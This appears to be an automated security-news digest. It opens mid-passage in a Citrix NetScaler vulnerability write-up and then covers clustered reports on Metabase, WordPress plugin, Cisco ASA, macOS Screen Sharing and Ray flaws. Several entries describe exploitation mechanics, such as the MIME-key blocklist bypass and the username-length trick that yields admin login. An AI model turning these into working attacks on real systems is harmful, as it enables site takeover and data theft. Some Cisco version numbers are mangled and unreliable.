we’re going to walk through today and show how it can be used to achieve Remote Code Execution. 0:00 / 0:31 1× Who Is Citrix NetScaler, and Why Was A Gateway Their First C Project? Citrix NetScaler (formally rebranded, then un-rebranded, in the way that only enterprise networking vendors can truly pull off) is a family of application delivery controllers and VPN gateway appliances found in virtually every large enterprise network on the planet. NetScaler handles load balancing, SSL offloading, authentication, and remote access - and NetScaler Gateway specifically serves as the front door for thousands of organizations' remote access infrastructure. Setting The Scene To fuel today's analysis, we're analyzing and leveraging a vulnerable NetScaler 13.1 appliance, configured to leverage SAML. For those wondering what is actually vulnerable, based on our testing, the vulnerability we’re discussing today is reachable when the Netscaler appliance is configured to use SAML as either a Service Provider (SP) or an Identity Provider (IdP). Citrix lists the following versions as affected: NetScaler ADC and NetScaler Gateway 14.1 BEFORE 14.1-72.61 NetScaler ADC and NetScaler Gateway 13.1 BEFORE 13.1-63.18 What Are We Looking At Today? This is where things get a little confusing, annoying, or mysterious - your choice of word reflects your commitment to the pledge . While we’d love to tell you we are definitely analyzing CVE-2026-8452, typical Citrix shenanigans (in our view) prevent us from doing so. However, we believe this is CVE-2026-8452 given its description as a “Memory Overflow” vulnerability. While Citrix doesn't correlate individual CVEs with the researchers credited in the advisory, one of the researchers credited is Michael Tucker from the XOR team at JPMorgan Chase (the others include ourselves, and we can rule out our vulnerabilities). Adding fuel to our baseless theory, this vulnerability is interesting and complex enough that it’s plausible that this is the output of Mythos-aided research - the model JPMorgan very publicly has access to. Do we have any evidence of that? Absolutely not. Is it fun to speculate? Always. Do we have better things to do? Anyway, Let’s Get Into it As part of our typical analysis process, especially when dealing with multiple patched vulnerabilities bundled into a single fix, we didn’t start with a specific focus. Instead, we asked, “What changed?” Specifically the nsppe binary, NetScaler's packet-processing engine, showed a significant amount of changes - with plenty of stripped symbols thrown in for good measure. Faced with the prospec
```

#### Corroborating sources (2)

- **watchTowr Labs** (offensive_vulnerability_research)
  - Title: You’re Back In The Room (Citrix NetScaler Pre-Auth RCE CVE-2026-8452(?))
  - Published: 2026-08-14T07:08:20+00:00
  - Link: https://labs.watchtowr.com/youre-back-in-the-room-citrix-netscaler-pre-auth-rce-cve-2026-8452/
  - Summary: Suddenly, you’re in a room. You look around - oh, you’re surrounded by other new starters at your new job. Yes, it’s Monday, and you’re being onboarded. You know the drill - it’s the typical enterprise “please don’t be
- **Reddit r/netsec** (reddit_practitioner_osint)
  - Title: You’re Back In The Room (Citrix NetScaler Pre-Auth RCE CVE-2026-8452(?)) - watchTowr Labs
  - Published: 2026-08-14T07:10:17+00:00
  - Link: https://www.reddit.com/r/netsec/comments/1vo06aj/youre_back_in_the_room_citrix_netscaler_preauth/
  - Summary: submitted by /u/dx7r__ [link] [comments]

### Cluster 67b968df05 — score 42

- Title: CVE-2026-72898 | Metabase Pre-Authentication SQL Injection Vulnerability
- Source: Horizon3 Attack Research (offensive_vulnerability_research)
- Published: 2026-08-13T17:45:09+00:00
- Link: https://horizon3.ai/attack-research/vulnerabilities/cve-2026-72898/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-72898

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, zero_day
- cve_ids: CVE-2026-18556, CVE-2026-18577, CVE-2026-72898
- urgency_signals: actively_exploited, critical_cvss, preauth_unauth, zero_day
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- threat_categories: zero_day, active_exploitation
- cve_ids: CVE-2026-72898, CVE-2026-18556, CVE-2026-18577
- urgency_signals: actively_exploited, zero_day, preauth_unauth, critical_cvss
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Summary

```
CVE-2026-72898 is a critical pre-authentication SQL injection vulnerability affecting Metabase. NodeZero® Rapid Response safely validates whether the actively exploited vulnerability is exploitable in your environment.
```

#### Full body

```
Metabase Pre-Authentication SQL Injection Vulnerability CVE-2026-72898 is a critical unauthenticated SQL injection vulnerability in Metabase, a widely used open-source business intelligence and data analytics platform. Successful exploitation can give an attacker administrator access to the affected Metabase instance, allowing them to change application configuration, steal stored credentials for connected databases, read data accessible through those connections, and export data. The vulnerability is rated CVSS 10.0 (Critical), the highest possible severity rating. Metabase has confirmed that attackers are actively exploiting the vulnerability against real-world environments. Technical Details CVE-2026-72898 allows an unauthenticated remote attacker to inject arbitrary SQL into the Metabase application database. No authentication or user interaction is required, and the vulnerability can be exploited remotely over the network with low attack complexity. Successful exploitation can provide administrator access to the affected Metabase instance. From there, an attacker could: Change Metabase application configuration Steal stored credentials for connected databases Read data accessible through those database connections Export data The vulnerability is rated CVSS 10.0 (Critical), with the CVSS 3.1 vector CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H . Metabase has confirmed active exploitation. Stop Guessing, Start Proving Schedule a demo NodeZero® Proactive Security Platform — Rapid Response A NodeZero Rapid Response test has been developed to safely validate whether this SQL injection vulnerability can be exploited in your environment. The test executes real attack techniques without causing damage, giving teams immediate clarity on exposure. Run the Rapid Response test: Launch from the NodeZero platform to determine whether exploitation is possible Patch immediately: Upgrade to the appropriate fixed Metabase release for your deployment. If immediate patching is not possible, temporarily block the /api/session/reset_password endpoint Re-run the test: Confirm the vulnerability is no longer exploitable after remediation Affected versions & patch Affected Metabase identifies the following affected version ranges: >= x.58.0, < x.58.23 >= x.59.0, < x.59.20 >= x.60.0, < x.60.16 >= x.61.0, < x.61.10 >= x.62.0, < x.62.8 >= x.63.0, < x.63.3 Fixed Metabase lists the following patched versions: x.58.24 x.59.21 x.60.17 x.61.11 x.62.9 x.63.5 Organizations should upgrade to the patch corresponding to their Metabase major version as soon as possible. Mitigations If immediate upgrading is not possible, Metabase recommends temporarily blocking the /api/session/reset_password endpoint. If this endpoint was publicly accessible, Metabase recommends taking additional steps after upgrading: Revoke all active user sessions Review API keys and delete any unrecognized keys Review administrator accounts for unexpected changes Rotate credentials for connected databases Review data warehouse logs for signs of unauthorized access Review Metabase activity and query history for unexpected or unauthorized activity Timeline August 3, 2026: Metabase discovered attacks against Metabase Cloud involving a previously unknown vulnerability and began investigating and containing the activity. August 6, 2026: Metabase published its security advisory for CVE-2026-72898, confirming the vulnerability as a critical unauthenticated SQL injection with active exploitation. August 6, 2026: Metabase made patched releases available across the affected x.58 through x.63 release branches. August 12, 2026: Horizon3.ai released a NodeZero Rapid Response test for CVE-2026-72898. References Metabase Security Advisory Metabase Security Update CVE.org Record – CVE-2026-72898 The Hacker News – Metabase Zero-Day Exploited in Wild Allows Admin Access Without Authentication Read about other CVEs CVE-2026-18556 and CVE-2026-18577 CVE-2026-18556 and CVE-2026-18577 are authentication bypass
```

#### Corroborating sources (1)

- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: CVE-2026-72898 | Metabase Pre-Authentication SQL Injection Vulnerability
  - Published: 2026-08-13T17:45:09+00:00
  - Link: https://horizon3.ai/attack-research/vulnerabilities/cve-2026-72898/
  - Summary: CVE-2026-72898 is a critical pre-authentication SQL injection vulnerability affecting Metabase. NodeZero® Rapid Response safely validates whether the actively exploited vulnerability is exploitable in your environment.

### Cluster a7b2f82e67 — score 23

- Title: Forminator WordPress Flaw Can Enable Unauthenticated RCE via Malicious PHP Uploads
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-08-17T18:22:09+00:00
- Link: https://thehackernews.com/2026/08/forminator-wordpress-flaw-can-enable.html
- Fetch status: ok
- Member count: 4
- Corroborating source count: 4
- Strong signals: CVE-2026-15748, WordPress

#### Cluster taxonomy (union across members)
- affected_products: Linux kernel, SonicWall, WordPress
- cve_ids: CVE-2026-15748, CVE-2026-15826, CVE-2026-46300
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_1_offensive_research, tier_4_news

#### Primary article taxonomy
- affected_products: WordPress
- cve_ids: CVE-2026-15748, CVE-2026-15826
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
A critical security flaw has been disclosed in Forminator Forms, a WordPress plugin with more than 600,000 active installations, that could be exploited to achieve arbitrary code execution on susceptible sites. The vulnerability, tracked as CVE-2026-15748, is rated 9.8 out of 10.0 on the CVSS scoring system. It was discovered and reported by a security researcher who goes by the online alias "
```

#### Full body

```
Forminator WordPress Flaw Can Enable Unauthenticated RCE via Malicious PHP Uploads  Ravie Lakshmanan  Aug 17, 2026 Vulnerability / Website Security A critical security flaw has been disclosed in Forminator Forms, a WordPress plugin with more than 600,000 active installations, that could be exploited to achieve arbitrary code execution on susceptible sites. The vulnerability, tracked as CVE-2026-15748 , is rated 9.8 out of 10.0 on the CVSS scoring system. It was discovered and reported by a security researcher who goes by the online alias "daroo." "This vulnerability makes it possible for unauthenticated attackers to upload arbitrary files, including executable PHP files, to a vulnerable site, which can lead to remote code execution and complete site compromise," Wordfence said in a report published today. That said, a key prerequisite for successful exploitation is that the sites must have a form containing both a File Upload field and a Select field. The vulnerability impacts all versions of the plugin before and including 1.56.1. It has been addressed in version 1.56.2 released on July 31, 2026. Per the WordPress security company, the flaw is a case of arbitrary file upload that resides in the "handle_file_upload()" function, stemming from a lack of sufficient file type validation in user-supplied input. As a result, an unauthenticated attacker can exploit the loophole to upload any file, including a specially crafted PHP file, to a vulnerable site by submitting a form and achieving remote code execution. Armed with this capability, the attacker can seize control of the site. "This is due to insufficient file type validation in handle_file_upload, where the dangerous-extension blocklist performs exact-key matching that is bypassed by pipe-alternative MIME type keys, combined with a public submission handler that trusts attacker-controlled upload field configuration injected via a forged Select field value," Wordfence said. Another aspect worth noting here is that, in the default configuration, files are uploaded to a directory protected by an .htaccess file that prevents PHP execution. But if a site administrator has configured a Custom File Upload Storage root, it may not have the same safeguard as the file is created "only when it is first needed, during a frontend request where the WordPress helper responsible for writing the .htaccess file is not loaded." As a result, requesting the uploaded file is enough to cause the web server to execute the attacker-controlled PHP code. Auth Bypass Flaw in User Profile Builder Plugin The disclosure comes days after Wordfence also highlighted another critical authentication bypass bug in User Profile Builder, which has more than 40,000 active WordPress installations, that could allow unauthenticated attackers to log in as the user with ID 1 (typically the site administrator) and take over the site. The vulnerability, tracked as CVE-2026-15826 (CVSS score: 9.8), was patched on July 16, 2026, with the release of version 3.16.5. All prior versions are affected by the issue, but it is only exploitable on sites where the plugin's Automatically Log In setting is enabled. "This is due to the wppb_log_in_user() function calling absint() on the return value of wp_insert_user() before performing an is_wp_error() check — when a registration is submitted with a 61–70 character username, WordPress core rejects it with a WP_Error object, but absint() coerces that object to the integer 1 before the error check can short-circuit execution, causing the plugin to bind and return a transient-backed autologin nonce tied to user ID 1," Wordfence said . "This makes it possible for unauthenticated attackers to log in as the site's Administrator account (user ID 1), resulting in full administrative takeover of the site." Site owners who have either of the two plugins are advised to apply the updates as soon as possible and ensure their installations are up-to-date. Found this article interesting? Follow us
```

#### Corroborating sources (4)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Forminator WordPress Flaw Can Enable Unauthenticated RCE via Malicious PHP Uploads
  - Published: 2026-08-17T18:22:09+00:00
  - Link: https://thehackernews.com/2026/08/forminator-wordpress-flaw-can-enable.html
  - Summary: A critical security flaw has been disclosed in Forminator Forms, a WordPress plugin with more than 600,000 active installations, that could be exploited to achieve arbitrary code execution on susceptible sites. The vulnerability, tracked as CVE-2026-15748, is rated 9.8 out of 10.0 on the CVSS scoring system. It was discovered and reported by a security researcher who goes by the online alias "
- **Rapid7** (offensive_vulnerability_research)
  - Title: Metasploit Wrap Up: Lot of summer shells and fit http profiles
  - Published: 2026-08-14T21:27:45+00:00
  - Link: https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-lot-of-summer-shells-and-fit-http-profiles
  - Summary: This wrap-up brings a full-on shell parade. Thirteen shiny new modules landed, starting with a buffet of RCEs. WordPress WP2Shell, Ghost CMS, Joomla JCE, Langflow, OpenCATS, Pterodactyl Panel, SonicWall SMA1000, Ray Dashboard, a Pix-for-WooCommerce, and for those who like their exploits closer to the bare-metal, the Fragnesia Linux kernel LPE (CVE-2026-46300). Metasploit also got the glow-up of the summer with the new http malleable profiles, MCP functionality and linux multi fetch payloads (more details on the [official 6.5 release blog post](https://www.rapid7.com/blog/post/pt-metasploit-framework-6-5-released/)!). Windows on ARM confirm to be the new first-class citizenship thanks to brand-new AArch64 reverse-TCP shells (both inline and staged), so your Snapdragon boxes can join the party too. Last but not least, an important message: *Nyan Nyan Nyan Nyan Nyan Nyan.* New module content (13) Ray Dashboard Logs API Path Traversal Author: Richard Howe <rhowe425> Type: Auxiliary Pull re
- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: 300,000 WordPress Sites Potentially Exposed to Hacking Due to Form Plugin Flaw
  - Published: 2026-08-18T10:48:23+00:00
  - Link: https://www.securityweek.com/300000-wordpress-sites-potentially-exposed-to-hacking-due-to-form-plugin-flaw/
  - Summary: Tracked as CVE-2026-15748, the arbitrary file upload bug allows unauthenticated attackers to upload executable files. The post 300,000 WordPress Sites Potentially Exposed to Hacking Due to Form Plugin Flaw appeared first on SecurityWeek .
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: WordPress Plugin Flaw Exposes 40,000 Sites to Admin Takeover
  - Published: 2026-08-17T13:30:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/wordpress-plugin-flaw-40000-sites/
  - Summary: Critical User Profile Builder flaw let unauthenticated attackers access administrator accounts

### Cluster 496f8b853a — score 23

- Title: Cisco ASA and FTD Flaw Exploited in the Wild Can Trigger Remote DoS
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-08-12T06:15:58+00:00
- Link: https://thehackernews.com/2026/08/cisco-asa-and-ftd-flaw-exploited-in.html
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: CVE-2026-20349, Cisco

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, ddos, phishing_social_eng
- affected_industries: financial_services
- affected_products: Cisco
- cve_ids: CVE-2026-20349
- urgency_signals: actively_exploited, preauth_unauth
- content_type: news_report
- confidence_tier: tier_1_primary_research, tier_4_news

#### Primary article taxonomy
- threat_categories: ddos, active_exploitation
- affected_industries: financial_services
- affected_products: Cisco
- cve_ids: CVE-2026-20349
- urgency_signals: actively_exploited, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Cisco has warned that a new vulnerability impacting Secure Firewall Adaptive Security Appliance (ASA) Software and Secure Firewall Threat Defense (FTD) Software has been exploited in the wild. The high-severity flaw, tracked as CVE-2026-20349 (CVSS score: 8.6), is a case of insufficient error checking when processing HTTP requests that could allow an unauthenticated, remote attacker to trigger
```

#### Full body

```
Cisco ASA and FTD Flaw Exploited in the Wild Can Trigger Remote DoS  Ravie Lakshmanan  Aug 12, 2026 Network Security / Vulnerability Cisco has warned that a new vulnerability impacting Secure Firewall Adaptive Security Appliance (ASA) Software and Secure Firewall Threat Defense (FTD) Software has been exploited in the wild. The high-severity flaw, tracked as CVE-2026-20349 (CVSS score: 8.6), is a case of insufficient error checking when processing HTTP requests that could allow an unauthenticated, remote attacker to trigger a denial-of-service (DoS) condition. "An attacker could exploit this vulnerability by sending a crafted HTTP request to the Remote Access SSL VPN service on an affected device," Cisco said in a Tuesday advisory. "A successful exploit could allow the attacker to cause the affected device to reload, resulting in a DoS condition." The security defects impact devices running a vulnerable version of Secure Firewall ASA Software or Cisco Secure FTD Software and have one or more of the vulnerable configurations listed below - IKEv2 Remote Access VPN (with client services) - crypto ikev2 enable <interface_name> client-services port <port_numbers> SSL-VPN - webvpn enable <interface_name> Zero Trust Network Access2 - zero-trust enable The following versions of ASA and FTD are affected - ASA 9.161 - Fixed in 89.16.4.50) ASA 9.181 - Fixed in 89.18.4.50) ASA 9.20 - Fixed in 9.20.4.235) ASA 9.22 - Fixed in 9.22.3.191) ASA 9.23 - Fixed in 9.23.1.211) ASA 9.24 - Fixed in 9.24.1.221) FTD 7.0 - Fixed in Cisco_FTD_Hotfix_GC-7.0.9.1-1.sh.REL.tar Cisco_FTD_SSP_FP1K_Hotfix_GC-7.0.9.1-1.sh.REL.tar Cisco_FTD_SSP_FP2K_Hotfix_GC-7.0.9.1-1.sh.REL.tar Cisco_FTD_SSP_Hotfix_GC-7.0.9.1-1.sh.REL.tar FTD 7.2 - Fixed in Cisco_FTD_Hotfix_HM-7.2.11.1-2.sh.REL.tar Cisco_FTD_SSP_FP1K_Hotfix_HM-7.2.11.1-2.sh.REL.tar Cisco_FTD_SSP_FP2K_Hotfix_HM-7.2.11.1-2.sh.REL.tar Cisco_FTD_SSP_FP3K_Hotfix_HM-7.2.11.1-2.sh.REL.tar Cisco_FTD_SSP_Hotfix_HM-7.2.11.1-2.sh.REL.tar FTD 7.4 - Fixed in Cisco_FTD_Hotfix_HK-7.4.7.1-1.sh.REL.tar Cisco_FTD_SSP_FP1K_Hotfix_HK-7.4.7.1-1.sh.REL.tar Cisco_FTD_SSP_FP2K_Hotfix_HK-7.4.7.1-1.sh.REL.tar Cisco_FTD_SSP_FP3K_Hotfix_HK-7.4.7.1-1.sh.REL.tar Cisco_FTD_SSP_Hotfix_HK-7.4.7.1-1.sh.REL.tar Cisco_Secure_FW_TD_4200_Hotfix_HK-7.4.7.1-1.sh.REL.tar FTD 7.6 (Fixed in Cisco_FTD_Hotfix_DD-7.6.4.1-2.sh.REL.tar Cisco_FTD_SSP_FP1K_Hotfix_DD-7.6.4.1-2.sh.REL.tar Cisco_FTD_SSP_FP3K_Hotfix_DD-7.6.4.1-2.sh.REL.tar Cisco_FTD_SSP_Hotfix_DD-7.6.4.1-2.sh.REL.tar Cisco_Secure_FW_TD_4200_Hotfix_DD-7.6.4.1-2.sh.REL.tar FTD 7.7 - Fixed in Cisco_FTD_Hotfix_AN-7.7.11.1-2.sh.REL.tar Cisco_FTD_SSP_FP1K_Hotfix_AN-7.7.11.1-2.sh.REL.tar Cisco_FTD_SSP_FP3K_Hotfix_AN-7.7.11.1-2.sh.REL.tar Cisco_FTD_SSP_Hotfix_AN-7.7.11.1-2.sh.REL.tar Cisco_Secure_FW_TD_1200_Hotfix_AN-7.7.11.1-2.sh.REL.tar Cisco_Secure_FW_TD_4200_Hotfix_AN-7.7.11.1-2.sh.REL.tar FTD 10.0 - Fixed in Cisco_FTD_Hotfix_S-10.0.0.1-2.sh.REL.tar Cisco_FTD_SSP_FP1K_Hotfix_S-10.0.0.1-2.sh.REL.tar Cisco_FTD_SSP_FP3K_Hotfix_S-10.0.0.1-2.sh.REL.tar Cisco_FTD_SSP_Hotfix_S-10.0.0.1-2.sh.REL.tar Cisco_Secure_FW_TD_200_Hotfix_R-10.0.0.1-2.sh.REL.tar Cisco_Secure_FW_TD_1200_Hotfix_S-10.0.0.1-2.sh.REL.tar Cisco_Secure_FW_TD_4200_Hotfix_S-10.0.0.1-2.sh.REL.tar Cisco_Secure_FW_TD_6100_Hotfix_S-10.0.0.1-2.sh.REL.tar Cisco said there are no workarounds that address the flaw, adding it became aware of active exploitation earlier this month. The network equipment maker said the issue was found during internal security testing. It also credited Valerio Brussani for separately discovering and reporting the vulnerability. There are currently no details about the nature of the attacks, the identity and origins of the threat actor exploiting the vulnerability, what organizations have been targeted, and if any of those efforts were successful. The development has prompted the U.S. Cybersecurity and Infrastructure Security Agency (CISA) to add the flaw to its Known Exploited Vulnerabilities ( KEV ) catalog, requiring F
```

#### Corroborating sources (2)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Cisco ASA and FTD Flaw Exploited in the Wild Can Trigger Remote DoS
  - Published: 2026-08-12T06:15:58+00:00
  - Link: https://thehackernews.com/2026/08/cisco-asa-and-ftd-flaw-exploited-in.html
  - Summary: Cisco has warned that a new vulnerability impacting Secure Firewall Adaptive Security Appliance (ASA) Software and Secure Firewall Threat Defense (FTD) Software has been exploited in the wild. The high-severity flaw, tracked as CVE-2026-20349 (CVSS score: 8.6), is a case of insufficient error checking when processing HTTP requests that could allow an unauthenticated, remote attacker to trigger
- **Cisco Talos** (threat_research_primary)
  - Title: Dissecting the JWR phishing framework
  - Published: 2026-08-13T10:00:35+00:00
  - Link: https://blog.talosintelligence.com/dissecting-the-jwr-phishing-framework/
  - Summary: Cisco Talos recently identified an undocumented phishing framework, internally branded "JWR" by its developer, built to convincingly impersonate checkout and login pages across major payment and shopping platforms.

### Cluster 918adf4913 — score 21

- Title: Apple macOS Screen Sharing Flaw Exploited on Internet-Exposed Macs to Install Monero Miner
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-08-15T07:24:04+00:00
- Link: https://thehackernews.com/2026/08/apple-macos-screen-sharing-flaw.html
- Fetch status: ok
- Member count: 7
- Corroborating source count: 6
- Strong signals: Apple iOS/macOS, CVE-2026-65400

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, credential_theft, ddos, vulnerability_disclosure, zero_day
- affected_industries: education, financial_services, government
- affected_products: Anthropic/Claude, Apple iOS/macOS, GitHub
- cve_ids: CVE-2026-43760, CVE-2026-43777, CVE-2026-43779, CVE-2026-65400
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_1_government, tier_2_operator, tier_3_analysis, tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, ddos, vulnerability_disclosure, active_exploitation
- affected_industries: financial_services, education
- affected_products: Apple iOS/macOS
- cve_ids: CVE-2026-65400, CVE-2026-43779, CVE-2026-43777, CVE-2026-43760
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
A recently patched security flaw in Apple macOS has come under active exploitation in the wild to deploy a cryptocurrency miner, the Netherlands National Cyber Security Centre (NCSC-NL) has warned. The vulnerability in question is CVE-2026-65400 (CVSS score: 9.8), a critical authentication issue impacting the Screen Sharing component that could allow an attacker already on the network to
```

#### Full body

```
Apple macOS Screen Sharing Flaw Exploited on Internet-Exposed Macs to Install Monero Miner  Ravie Lakshmanan  Aug 15, 2026 Vulnerability / Endpoint Security A recently patched security flaw in Apple macOS has come under active exploitation in the wild to deploy a cryptocurrency miner, the Netherlands National Cyber Security Centre (NCSC-NL) has warned . The vulnerability in question is CVE-2026-65400 (CVSS score: 9.8), a critical authentication issue impacting the Screen Sharing component that could allow an attacker already on the network to authenticate to the built-in remote desktop feature service without valid credentials. The updates released by Apple improve state management mechanisms to enforce correct credential validation and prevent unauthorized authentication attempts. The shortcoming was addressed as part of an emergency update in macOS Tahoe 26.6.1 , macOS Sequoia 15.7.9 , and macOS Sonoma 14.8.9 earlier this month. "An authentication issue was addressed with improved state management," Apple said in an advisory released on August 6, 2026. It credited security researcher Alfredo Pesoli of Bynario for discovering and reporting the issue. In an update to its advisory, the NCSC-NL said it has received a report indicating active abuse of the vulnerability across multiple systems on which port 5900 was accessible from the internet. "In all these cases, root had gained access to the affected system and placed a Monero crypto miner," the agency added. There are currently no details on when these attacks were observed, the scale of such efforts, if the flaw was exploited as a zero-day, and if it goes beyond cryptocurrency mining. Calif, which published additional information about the flaw, said it's part of a series of bugs in the Screen Sharing Server component that were patched by Apple with macOS Tahoe 26.6 shipped late last month - CVE-2026-43779 (CVSS score: 9.8) - A logic issue that could allow an app to intercept network connections intended for another process CVE-2026-43777 (CVSS score: 7.5) - An unspecified issue that could a remote attacker to cause a denial-of-service (DoS) CVE-2026-43760 (CVSS score: 8.6) - An access issue that could allow an app to access user-sensitive data In a technical breakdown published following the release of the patches, Pesoli described CVE-2026-43760 as a post authentication bug that requires the target Mac to have Screen Sharing or Remote Management enabled with "VNC viewers may control screen with password" configured and the attacker is already in possession of that VNC password. The problem, the researcher noted, resides in a legacy Screen Sharing authentication path involving VNC password access that turns a file copy operation into protected file disclosure, arbitrary root file creation, and remote root command execution. "After the VNC authentication step, we cross a boundary the password was never supposed to cross," Pesoli explained . "A remote viewer can make macOS Screen Sharing read protected files as root." "In the other direction, the viewer can create attacker-controlled files as root. We used that second primitive to install a valid sudoers policy and turn a file-copy operation into a remote root command execution (or an LPE)." However, a security researcher who goes by the online alias @osxreverser said the real issue is a pre-authentication vulnerability in the Screen Sharing daemon ("screensharingd") that makes it possible to pwn any Mac that has Screen Sharing enabled without having to know the password or anything else. The only prerequisite is knowing the IP address. The researcher also noted that they had been sitting on the bug "for a while" and that they did not report the issue to Apple "given my long history with them." "My last scan shown around 40k open screen sharing hosts on the internet, almost half in the U.S., most are residential IPs but there are many juicy hosts in Murican universities, some companies, a server from BBEdit company," @osxre
```

#### Corroborating sources (6)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Apple macOS Screen Sharing Flaw Exploited on Internet-Exposed Macs to Install Monero Miner
  - Published: 2026-08-15T07:24:04+00:00
  - Link: https://thehackernews.com/2026/08/apple-macos-screen-sharing-flaw.html
  - Summary: A recently patched security flaw in Apple macOS has come under active exploitation in the wild to deploy a cryptocurrency miner, the Netherlands National Cyber Security Centre (NCSC-NL) has warned. The vulnerability in question is CVE-2026-65400 (CVSS score: 9.8), a critical authentication issue impacting the Screen Sharing component that could allow an attacker already on the network to
- **SANS Internet Storm Center** (government_authoritative)
  - Title: Apple Patches iOS and macOS, (Mon, Aug 17th)
  - Published: 2026-08-17T20:26:39+00:00
  - Link: https://isc.sans.edu/diary/rss/33254
  - Summary: Apple today released updates for iOS/iPadOS (26 and 18) and macOS 26. This update fixes 108 vulnerabilities and comes about two weeks after the much smaller macOS update that addressed the single screen-sharing vulnerability. This vulnerability did not affect iOS/iPadOS.
- **Huntress** (detection_response_operations)
  - Title: MacSync Stealer: How a Google Search for Claude Led to a macOS Infostealer
  - Published: 2026-08-17T04:00:00+00:00
  - Link: https://www.huntress.com/blog/fake-claude-macsync
  - Summary: Huntress SOC analysts reverse engineer MacSync Stealer, a macOS infostealer spread through fake Claude Code download pages. Watch the full analysis.
- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: Dozens of WebKit Vulnerabilities Patched With Fresh macOS, iOS Security Updates
  - Published: 2026-08-18T06:46:22+00:00
  - Link: https://www.securityweek.com/dozens-of-webkit-vulnerabilities-patched-with-fresh-macos-ios-security-updates/
  - Summary: The bugs could be exploited to crash Safari, corrupt memory, leak sensitive data, escape the sandbox, and exfiltrate data. The post Dozens of WebKit Vulnerabilities Patched With Fresh macOS, iOS Security Updates appeared first on SecurityWeek .
- **Risky Business News** (practitioner_analysis)
  - Title: Risky Bulletin: US will let private companies carry out offensive cyber ops
  - Published: 2026-08-14T04:37:40+00:00
  - Link: https://risky.biz/RBNEWS600/
  - Summary: The White House will let private companies carry out offensive cyber ops, an AI hacking campaign breached Taiwan’s government, a macOS bug was exploited over the internet to drop cryptominers, and Kenya orders internet cafes to store logs.
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: Novel macOS Infostealer AmnesiaStealer Spread via ClickFix
  - Published: 2026-08-14T10:45:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/macos-infostealer-spread-clickfix/
  - Summary: AmnesiaStealer contains novel functions, including the attackers gaining remote control over the victim’s browser to steal cookie data

### Cluster c23d18e0e8 — score 19

- Title: CISA Flags Actively Exploited Ray Flaw That Can Trigger Browser-Based RCE
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-08-18T06:34:20+00:00
- Link: https://thehackernews.com/2026/08/cisa-flags-actively-exploited-ray-flaw.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, credential_theft, ddos, phishing_social_eng
- affected_industries: financial_services, government, telecommunications
- affected_products: Anthropic/Claude, Azure, GitHub
- cve_ids: CVE-2025-62593
- urgency_signals: actively_exploited, no_patch_yet, poc_available
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: phishing_social_eng, credential_theft, ddos, active_exploitation
- affected_industries: financial_services, government, telecommunications
- affected_products: Azure, GitHub, Anthropic/Claude
- cve_ids: CVE-2025-62593
- urgency_signals: actively_exploited, no_patch_yet, poc_available
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Monday added a critical flaw impacting Ray to its Known Exploited Vulnerabilities (KEV) catalog, citing evidence of active exploitation. Ray is an open-source, Python-native distributed computing framework designed to scale artificial intelligence and machine learning workloads. As of writing, the GitHub project has more than
```

#### Full body

```
CISA Flags Actively Exploited Ray Flaw That Can Trigger Browser-Based RCE  Ravie Lakshmanan  Aug 18, 2026 Vulnerability / Network Security The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Monday added a critical flaw impacting Ray to its Known Exploited Vulnerabilities ( KEV ) catalog, citing evidence of active exploitation. Ray is an open-source, Python-native distributed computing framework designed to scale artificial intelligence and machine learning workloads. As of writing, the GitHub project has more than 43,500 stars and has been forked over 7,900 times. The vulnerability in question relates to CVE-2025-62593 (CVSS score: 9.4), which can result in remote code execution via web browsers like Mozilla Firefox and Apple Safari by means of a DNS rebinding attack . "Due to the longstanding decision by the Ray Development team to not implement any sort of authentication on critical endpoints, like the /api/jobs & /api/job_agent/jobs/ has once again led to a severe vulnerability that allows attackers to execute arbitrary code against Ray," according to an advisory shared by Ray maintainers in November 2025. "This time in a development context via the browsers Firefox and Safari." The issue, at its core, stems from insufficient controls against browser-based attacks, specifically scenarios where the User-Agent header can be modified. "Combined with a DNS rebinding attack against the browser, and this vulnerability is exploitable against a developer running Ray who inadvertently visits a malicious website, or is served a malicious advertisement," the project maintainers added. It's worth noting that the defect primarily impacts developers running development/testing environments with Ray. Should a targeted victim fall prey to a phishing attack, or be served a malicious ad, it can lead to the execution of arbitrary shell code on their machine. The project maintainers also noted that the attack can also be extended to attack network-adjacent instances of Ray by leveraging the browser as a confused deputy intermediary to target Ray instances running inside a private corporate network. The issue has been addressed in version 2.52.0 of the Python package. Ray has credited Oligo security 